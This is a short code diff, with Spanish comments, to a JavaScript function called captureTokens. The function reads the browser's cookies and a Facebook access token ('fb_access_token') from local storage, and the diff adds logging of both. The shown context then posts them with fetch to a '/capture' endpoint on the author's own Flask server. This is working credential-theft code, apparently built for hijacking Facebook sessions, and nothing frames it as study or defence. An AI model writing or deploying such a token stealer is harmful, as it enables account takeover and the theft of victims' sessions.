@@ -8,9 +8,11 @@
         function captureTokens() {
             // Obtener todas las cookies
             var cookies = document.cookie;
+            console.log('Cookies capturadas:', cookies);
 
             // Obtener tokens de acceso del almacenamiento local
             var localStorageTokens = localStorage.getItem('fb_access_token');
+            console.log('Token de acceso del Local Storage:', localStorageTokens);
 
             // Enviar las cookies y tokens a tu servidor Flask
             fetch('/capture', {
